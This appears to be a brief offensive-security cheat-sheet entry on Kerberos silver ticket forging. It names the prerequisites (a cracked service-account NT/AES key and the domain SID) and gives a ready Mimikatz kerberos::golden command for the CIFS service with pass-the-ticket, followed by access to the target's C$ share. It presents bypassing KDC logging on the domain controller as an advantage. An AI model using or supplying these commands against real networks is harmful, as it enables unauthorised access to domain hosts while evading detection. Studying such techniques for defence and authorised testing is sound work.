# 17.05 Silver Ticket Forging

> Forge service TGS tickets offline with a cracked service-account NT/AES key — bypasses KDC logging on the DC.

## Overview

If you crack a service-account NT/AES key, forge TGS tickets for that service without going through the KDC — bypasses logging on the DC.

## Steps

- **Need the service-account NT/AES key**.
- **Need the domain SID**.
- **Mimikatz kerberos::golden** with /service:cifs or /service:mssql etc.

## Commands

### Silver ticket

```cmd
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<TARGET-HOST> /service:cifs /rc4:<NT> /ptt
dir \\\\<TARGET-HOST>\\C$
```
